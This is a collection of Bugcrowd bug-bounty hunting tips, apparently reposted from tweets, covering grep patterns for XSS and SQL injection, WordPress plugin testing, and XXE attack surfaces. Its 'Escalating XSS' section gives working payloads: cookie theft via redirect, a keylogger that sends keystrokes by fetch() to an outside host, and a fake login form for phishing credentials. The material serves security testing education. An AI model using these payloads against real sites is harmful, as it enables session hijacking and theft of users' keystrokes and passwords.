# Bugcrowd Tip Jar

## More complex = Less Secure

Source: https://twitter.com/Bugcrowd/status/1352126283505922049

```
When hunting for bugs, look for features that are complex. As a rule of thumb:

More complex = less secure.
```

## Grep for Code Analysis

Source: https://twitter.com/Bugcrowd/status/1349525327811231745

```
If you're hunting for low-hanging bugs in source code, grep and regex can help you to identify hotspots. For example, you might find basic rXSS in PHP with something like this:

grep -r "echo.*\$_\(GET\|REQUEST\|POST\)" .

Or to uncover potential SQL injection you could try:

grep -r "SELECT.*\\.\\ \\$" .

It will still take some manual work, but this can be a good way to focus your attention on the most obvious weak points.

To take this technique to the next level, checkout gf by tomnomnom: https://github.com/tomnomnom/gf.

For some more tasty regex ideas, checkout the [Trufflehog regexes](https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json).
```

## Wordpress Plugins

Source: https://twitter.com/Bugcrowd/status/1347015120287916032

```
Found a Wordpress site? The easiest place to find bugs is in the plugins.

1. Find the installed plugins with WPScan
2. Set up your own WP instance and install the same plugins
3. Hack your own instance
4. Report your bugs!

The most common bug you'll find with this method is XSS
```

## Common XXE Weakpoints

Source: https://twitter.com/Bugcrowd/status/1342184648856616972

```
XXE's are still quite common, and they're usually a P1! 
Here are places that you can look for them:

1. Uploading Open XML documents such as MS Offics docs (docx, xlsx, pptx). They're all just zip files filled with XML files. If these documents get parsed on the server-side, there's a chance that they will also parse external entities within those files.

2. Functionality that parses RSS feeds (they're XML too!)

3. Functionality that parses HTML (for example, converting HTML to PDF)

4.  Functionality that parses sitemap.xml files.

5. SAML requests.

6. Content-Type with application/json can also be replaced with application/xml. Many parsers support that.

7. SVG files (if they get parsed in some way on the server)
```

## Escalating XSS

Source: https://twitter.com/Bugcrowd/status/1339417608169222145

```
Here are a few ways to make the most of an XSS.

1. Grab the victim's cookies by redirecting to an attacker's server and appending the cookie value, e.g. document.location='bugcrowd.com/?'+document.cookie

2. Perform a sensitive action as the victim user (such as changing their password or email address). Having an XSS allows you to bypass SOP and Anti-CSRF mechanisms. See here for some payloads + inspiration: https://github.com/hakluke/weaponised-XSS-payloads

3. Plant a JavaScript keylogger (from https://github.com/swisskyrepo/PayloadsAllTheThings)
<img src=x onerror='document.onkeypress=function(e){fetch("http://bugcrowd.com/?k="+String.fromCharCode(e.which))},this.remove();'>

4. Redress the window with a fake HTML login form to phish credentials: document.body.innerHTML = "<form action='https://bugcrowd.com'><input type='text' value='email' name='email'><input type='password' value='password' name='password'><input type='submit'></form>"
```
